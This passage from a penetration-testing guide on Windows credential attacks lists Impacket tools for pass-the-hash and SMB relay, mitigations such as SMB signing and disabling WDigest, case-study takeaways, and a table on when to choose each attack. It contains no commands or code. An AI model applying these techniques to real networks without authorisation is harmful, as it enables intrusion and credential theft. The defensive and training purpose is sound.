│                                                                 │
│  Hash-Based Authentication                                      │
│  ───────────────────────────────────                            │
│  • smbexec.py: SMB execution with hash                         │
│  • psexec.py: SMB service execution                            │
│  • wmiexec.py: WMI execution with hash                         │
│                                                                 │
│  SMB Relay                                                      │
│  ────────────                                                   │
│  • ntlmrelayx.py: SMB relay attacks                            │
│  • impacket: Various network protocols                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mitigation Strategies

```
┌─────────────────────────────────────────────────────────────────┐
│            Mitigation Strategies                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Prevent Hash Interception                                      │
│  ───────────────────────────────────                            │
│  • Disable LLMNR and NBT-NS                                    │
│  • Implement SMB signing                                        │
│  • Use network segmentation                                    │
│  • Monitor for suspicious network activity                     │
│                                                                 │
│  Prevent Default Credential Exploitation                       │
│  ────────────────────────────────────────────────               │
│  • Change default passwords immediately                         │
│  • Implement strong password policies                           │
│  • Disable unnecessary services                                │
│  • Regularly audit service configurations                       │
│                                                                 │
│  Prevent Credential Dumping                                     │
│  ───────────────────────────────────                            │
│  • Implement least privilege                                   │
│  • Use protected users group                                   │
│  • Enable credential guard                                     │
│  • Monitor for credential dumping attempts                     │
│                                                                 │
│  Prevent Wdigest Exploitation                                  │
│  ───────────────────────────────────                            │
│  • Disable Wdigest on older systems                            │
│  • Upgrade to newer Windows versions                           │
│  • Implement strong password policies                           │
│  • Monitor for credential extraction attempts                  │
│                                                                 │
│  Prevent Hardcoded Credential Exposure                          │
│  ────────────────────────────────────────────────               │
│  • Remove hardcoded credentials from documentation             │
│  • Use secure credential management                            │
│  • Implement proper access controls                            │
│  • Regularly audit documentation for sensitive data            │
│                                                                 │
│  General Security Best Practices                                │
│  ────────────────────────────────────────────────               │
│  • Implement defense in depth                                   │
│  • Regular security assessments                                │
│  • Security awareness training                                 │
│  • Incident response planning                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Summary

### Key Takeaways

```
┌─────────────────────────────────────────────────────────────────┐
│                    Key Takeaways                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Case Study 1: Hash Relay & Reuse                              │
│  ───────────────────────────────────                            │
│  • Hash relay works even without cracking                      │
│  • Password reuse is a common vulnerability                    │
│  • Hash-based authentication bypasses password requirements    │
│                                                                 │
│  Case Study 2: Default Credentials & Wdigest                   │
│  ────────────────────────────────────────────────               │
│  • Default credentials are often left unchanged                │
│  • Clear-text passwords can be found in configuration files    │
│  • Wdigest exposes passwords in memory on older systems        │
│                                                                 │
│  Case Study 3: Hardcoded Credentials                           │
│  ───────────────────────────────────                            │
│  • Documentation often contains hardcoded credentials          │
│  • Public shares can contain sensitive information             │
│  • Hash cracking can provide initial access                    │
│                                                                 │
│  General Lessons:                                               │
│  ────────────────────                                           │
│  • Multiple attack vectors can be combined                     │
│  • Persistence is key to successful compromise                 │
│  • Defense in depth is essential for security                  │
│  • Regular security assessments help identify vulnerabilities  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Strategy Selection

```
┌─────────────────────────────────────────────────────────────────┐
│            Attack Strategy Selection                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  When to Use Hash Relay (Case Study 1):                        │
│  ────────────────────────────────────────────────               │
│  • Passwords are uncrackable                                   │
│  • IPv6 is disabled (no MITM6)                                 │
│  • Network traffic contains NTLM hashes                        │
│  • Password reuse is suspected                                 │
│                                                                 │
│  When to Use Default Credentials (Case Study 2):               │
│  ────────────────────────────────────────────────────           │
│  • No relaying possible                                        │
│  • Services with default configurations exist                  │
│  • Older Windows systems present                               │
│  • Clear-text passwords suspected                              │
│                                                                 │
│  When to Use Hardcoded Credentials (Case Study 3):             │
│  ────────────────────────────────────────────────────           │
│  • Limited initial access                                      │
│  • Public shares accessible                                    │
│  • Documentation available                                     │
│  • Hash cracking possible                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```
